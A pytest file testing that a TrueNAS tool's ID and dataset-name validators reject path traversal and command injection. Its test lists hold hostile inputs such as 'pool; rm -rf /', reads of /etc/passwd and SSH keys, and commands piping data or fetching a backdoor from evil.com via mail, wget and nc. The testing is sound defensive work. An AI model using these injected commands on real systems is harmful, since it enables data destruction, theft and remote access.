"""Tests for TrueNAS ID validation against path traversal attacks."""

import sys
import os
import re

# Add src directory to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src', 'utils'))

# Import just the validation functions we need by loading the module directly
import importlib.util
spec = importlib.util.spec_from_file_location(
    "validation",
    os.path.join(os.path.dirname(__file__), '..', 'src', 'utils', 'validation.py')
)
validation = importlib.util.module_from_spec(spec)
spec.loader.exec_module(validation)

validate_id = validation.validate_id
validate_dataset_name = validation.validate_dataset_name

import pytest


class TestIdValidation:
    """Test ID validation to prevent path traversal attacks."""
    
    def test_valid_ids(self):
        """Test valid IDs."""
        valid_ids = [
            "pool1",
            "my-pool",
            "pool_name",
            "pool.name",
            "test123",
            "POOLNAME",
            "pool-123_test.name"
        ]
        
        for id_val in valid_ids:
            assert validate_id(id_val) is True, f"Expected '{id_val}' to be valid"
    
    def test_path_traversal_attempts(self):
        """Test that path traversal attempts are rejected."""
        path_traversal_ids = [
            "../",
            "../../etc/passwd",
            "pool/../../../etc",
            "pool/../../shadow",
            "..\\..\\windows",
            "pool\\..\\system32",
            "..",
            "pool/..",
            "pool/../other",
            "pool/./secret",
            "/etc/passwd",
            "\\windows\\system32",
            "pool/../../../../../../root/.ssh/id_rsa"
        ]
        
        for id_val in path_traversal_ids:
            assert validate_id(id_val) is False, f"Expected path traversal '{id_val}' to be invalid"
    
    def test_command_injection_attempts(self):
        """Test that command injection attempts are rejected."""
        injection_ids = [
            "pool; rm -rf /",
            "pool && cat /etc/passwd",
            "pool | mail attacker@evil.com",
            "pool`whoami`",
            "pool$(id)",
            "pool;reboot",
            "pool&wget evil.com/backdoor",
            "pool|nc evil.com 1234"
        ]
        
        for id_val in injection_ids:
            assert validate_id(id_val) is False, f"Expected injection attempt '{id_val}' to be invalid"
    
    def test_empty_and_invalid_types(self):
        """Test empty strings and invalid types."""
        invalid_ids = [
            "",  # Empty
            None,  # None
            123,  # Not a string
            [],  # List
            {},  # Dict
            "a" * 300  # Too long
        ]
        
        for id_val in invalid_ids:
            assert validate_id(id_val) is False, f"Expected '{id_val}' to be invalid"


class TestDatasetNameValidation:
    """Test dataset name validation (allows hierarchy but prevents path traversal)."""
    
    def test_valid_dataset_names(self):
        """Test valid dataset names with hierarchy."""
        valid_names = [
            "pool",
            "pool/dataset",
            "pool/parent/child",
            "pool/data/app/logs",
            "mypool/mydataset",
            "pool-1/dataset_2",
            "pool.name/dataset.name",
            "pool/dataset-test_123"
        ]
        
        for name in valid_names:
            assert validate_dataset_name(name) is True, f"Expected dataset name '{name}' to be valid"
    
    def test_path_traversal_in_dataset_names(self):
        """Test that path traversal is rejected even with hierarchy."""
        path_traversal_names = [
            "../",
            "pool/../other",
            "pool/dataset/../../../etc",
            "pool/../../../etc/passwd",
            "..",
            "pool/..",
            "pool/dataset/..",
            "pool/../dataset",
            "..\\..\\windows",
            "pool\\..\\system32"
        ]
        
        for name in path_traversal_names:
            assert validate_dataset_name(name) is False, f"Expected path traversal '{name}' to be invalid"
    
    def test_command_injection_in_dataset_names(self):
        """Test that command injection is rejected."""
        injection_names = [
            "pool; rm -rf /",
            "pool/dataset && cat /etc/passwd",
            "pool|mail attacker@evil.com",
            "pool`whoami`",
            "pool$(id)/dataset",
            "pool/dataset;reboot"
        ]
        
        for name in injection_names:
            assert validate_dataset_name(name) is False, f"Expected injection '{name}' to be invalid"
    
    def test_empty_and_invalid_types(self):
        """Test empty strings and invalid types."""
        invalid_names = [
            "",  # Empty
            None,  # None
            123,  # Not a string
            [],  # List
            {},  # Dict
            "a" * 600  # Too long
        ]
        
        for name in invalid_names:
            assert validate_dataset_name(name) is False, f"Expected '{name}' to be invalid"


class TestURLConstructionSafety:
    """Test that validated IDs are safe for URL construction."""
    
    def test_safe_url_construction(self):
        """Test that validated IDs can be safely used in URLs."""
        safe_ids = [
            "pool1",
            "my-pool",
            "pool_name",
            "test-123"
        ]
        
        for id_val in safe_ids:
            assert validate_id(id_val) is True
            # Simulate URL construction (what the client does)
            url = f"pool/id/{id_val}"
            # Ensure no path traversal in constructed URL
            assert ".." not in url
            assert url.startswith("pool/id/")
            assert url == f"pool/id/{id_val}"
    
    def test_unsafe_url_construction_prevented(self):
        """Test that malicious IDs cannot manipulate URL paths."""
        malicious_ids = [
            "../../../etc/passwd",
            "pool/../../../etc",
            "../../shadow"
        ]
        
        for id_val in malicious_ids:
            # Validation should reject these
            assert validate_id(id_val) is False
            # If somehow used in URL construction (shouldn't happen due to validation)
            # the path traversal would be visible
            url = f"pool/id/{id_val}"
            # These would create dangerous paths
            assert ".." in url  # Shows the danger


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
